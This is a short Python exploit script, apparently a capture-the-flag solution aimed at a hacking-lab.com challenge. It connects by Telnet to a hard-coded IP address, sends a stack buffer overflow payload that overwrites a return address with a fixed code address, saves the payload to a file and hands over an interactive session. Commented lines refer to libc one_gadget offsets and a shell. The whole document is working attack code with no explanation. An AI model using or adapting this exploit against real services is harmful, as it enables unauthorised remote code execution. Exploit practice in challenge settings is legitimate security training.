#from pwn import *
from telnetlib import *

#r = remote('whale.hacking-lab.com', 7331)
r = Telnet('46.101.107.117', 2102)
libc_start_main_ret = 0x20830
one_gadget = 0xf1147

r.read_until(b'> ')
# craft gadget
# og = p64(leak - libc_start_main_ret + one_gadget)
sysAddr = 0x00400610
# log.info('crafting gadget:\n\t%s', og.encode('hex'))

# crafting payload
payload = b'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD' + \
        bytes([0x6d, 0x08, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]) + \
        b'\n'
with open('payload', 'wb') as payF:
    payF.write(payload)

r.write(payload)

# r.read_until(b'\033[H\033[J\033[8;0H')
# log.info('enjoy your shell :)')
r.interact()
